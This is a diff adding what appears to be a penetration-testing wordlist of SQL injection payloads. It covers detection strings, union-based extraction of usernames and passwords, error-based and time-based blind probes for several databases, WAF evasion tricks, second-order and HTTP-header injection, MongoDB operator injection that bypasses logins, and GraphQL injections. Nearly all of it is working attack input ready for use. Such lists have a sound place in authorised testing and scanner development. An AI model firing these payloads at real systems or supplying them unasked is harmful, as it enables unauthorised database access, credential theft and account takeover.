@@ -1,0 +1,87 @@
+# SQL Injection Payloads
+# Classic + WAF bypass + NoSQL + Second-order + Header injection
+
+# ── Detection ────────────────────────────────────────────────────────────────
+'
+''
+`
+')
+"))
+' OR '1'='1
+' OR 1=1--
+' OR 1=1#
+1; SELECT SLEEP(5)--
+1' AND SLEEP(5)--
+1 WAITFOR DELAY '0:0:5'--
+
+# ── Union-based ───────────────────────────────────────────────────────────────
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+' UNION SELECT username,password,3 FROM users--
+' UNION ALL SELECT table_name,2,3 FROM information_schema.tables--
+
+# ── Error-based ───────────────────────────────────────────────────────────────
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+
+# ── Blind time-based ─────────────────────────────────────────────────────────
+# MySQL
+1' AND SLEEP(5)--
+1; SELECT SLEEP(5)--
+# MSSQL
+1'; WAITFOR DELAY '0:0:5'--
+# Oracle
+1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+# PostgreSQL
+1'; SELECT pg_sleep(5)--
+
+# ── WAF bypass techniques ─────────────────────────────────────────────────────
+# Comment injection
+SE/**/LECT 1,2,3
+1 /*!UNION*/ /*!SELECT*/ 1,2,3
+# Case mixing
+SeLeCt 1,2,3 FrOm uSeRs
+# URL double-encoding
+%2527  (decoded = %27 = ')
+%2525  (double-encoded %)
+# Whitespace alternatives
+SELECT%091,2%09FROM%09users  (tab)
+SELECT%0A1,2%0AFROM%0Ausers  (newline)
+# Null byte
+%00' OR '1'='1
+# Inline comment as space replacement
+1'/**/UNION/**/SELECT/**/NULL--
+# MySQL scientific notation
+SELECT 1e0UNION SELECT 1,2,3
+
+# ── Second-order injection ────────────────────────────────────────────────────
+# Register with username: admin'--
+# Then change password → query becomes:
+# UPDATE users SET pass='x' WHERE user='admin'--'
+# → updates admin account without knowing their password
+
+# ── Header injection ──────────────────────────────────────────────────────────
+# Test these headers with SQLi payloads:
+X-Forwarded-For: 1' OR SLEEP(5)--
+User-Agent: ' OR SLEEP(5)--
+Referer: ' OR SLEEP(5)--
+X-Real-IP: 1' OR 1=1--
+Cookie: session=1' OR SLEEP(5)--
+
+# ── NoSQL injection (MongoDB) ─────────────────────────────────────────────────
+# In JSON body:
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": "admin", "password": {"$regex": ".*"}}
+# In URL params:
+?user[$ne]=invalid&pass[$ne]=invalid
+?user[$regex]=admin.*&pass[$ne]=x
+# Operator injection
+?user=admin'%20%26%26%20'1'%3d%3d'1
+
+# ── GraphQL SQLi ──────────────────────────────────────────────────────────────
+{"query": "{ user(id: \"1' OR SLEEP(5)--\") { name email } }"}
+{"query": "{ user(name: \"admin' UNION SELECT null,username,password FROM users--\") { id } }"}
